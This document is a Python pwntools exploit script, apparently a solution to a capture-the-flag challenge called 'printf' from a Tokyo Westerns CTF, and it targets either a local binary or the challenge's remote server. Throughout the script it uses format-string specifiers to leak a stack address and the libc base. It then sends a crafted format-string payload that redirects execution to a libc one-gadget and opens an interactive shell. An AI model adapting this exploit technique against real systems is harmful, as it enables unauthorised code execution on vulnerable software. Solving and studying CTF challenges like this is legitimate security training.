#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4', env = {'LD_PRELOAD': './libc-d7ab015f68cd23c410d57af6552deb54bcb16ff64177c8f2c671902915b75110.so.6'})
else:
    s = remote('printf.chal.ctf.westerns.tokyo', 10001)

payload = ''
payload += '%d' * 0x1e
payload += ',%llx,'
payload += '%d' * 1
payload += ',%llx'

s.sendlineafter("What's your name?\n", payload)

s.recvline()
res = s.recvline(False).split(',')
stack_addr = int(res[1], 0x10)
log.info('stack address: %#x' % stack_addr)
libc_base = int(res[3], 0x10) - 0xbab55
log.info('libc base: %#x' % libc_base)

frame_addr = stack_addr - 0x276
log.info('frame address: %#x' % frame_addr)
input_addr = stack_addr - 0xe6
log.info('input address: %#x' % input_addr)

one_gadgets = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]

payload = ''
payload += 'A'
payload += '%c' * (7 + 7)
payload += '%{}c'.format(0x151)
payload += '%s' * 0x4
payload += 'A' * 7
payload += p64(libc_base + one_gadgets[2])
payload = payload.ljust(0x40, '\0')
payload += p64(input_addr + 0x100 - 0x81) * 0x2
payload += p64(input_addr + 0x100 - 0x71)
payload += p64(frame_addr - 0x2e0)
payload = payload.ljust(0x100, 'A')

s.sendafter('Do you leave a comment?\n', payload)
s.recvline()

s.interactive()
